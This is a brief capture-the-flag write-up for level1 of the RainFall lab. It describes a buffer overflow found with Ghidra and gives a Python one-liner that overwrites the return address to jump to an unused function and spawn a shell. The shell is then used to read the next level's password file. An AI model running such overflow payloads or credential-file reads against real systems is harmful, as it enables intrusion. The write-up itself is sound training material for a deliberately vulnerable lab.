# Level1

## Analysis
Using ghidra we saw that the program is vulnerable to a buffer overflow and that it has a function called run but it is not used in the program. We can use this function to get a shell.

```bash
level1@RainFall:~$ (python -c "import struct; print('A' * 76 + struct.pack('I', 0x8048472))";cat) | ./level1
whoami
level2
cat /home/user/level2/.pass
